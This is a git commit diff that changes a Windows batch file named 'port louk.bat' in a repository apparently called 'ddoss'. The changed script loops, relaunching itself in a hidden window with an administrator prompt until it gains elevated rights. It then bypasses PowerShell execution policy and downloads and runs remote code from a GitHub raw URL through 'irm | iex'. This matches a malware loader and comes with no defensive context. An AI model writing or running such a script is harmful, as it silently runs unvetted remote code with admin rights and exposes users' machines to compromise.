3dc77c5731e3fe567f8638b7a1033c7352fbe4f0
srap18 <48030957+srap18@users.noreply.github.com>
2025-08-09 04:44:59 +0300

    Update port louk.bat

--- port louk.bat
+++ port louk.bat
@@ -1,2 +1,10 @@
 @echo off
-powershell -Command "irm https://raw.githubusercontent.com/srap18/ddoss/main/1122 | iex"
+:retry
+net session >nul 2>&1
+if %errorlevel% neq 0 (
+    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden"
+    timeout /t 1 /nobreak >nul
+    goto retry
+)
+powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/srap18/ddoss/main/1122 | iex"
+pause
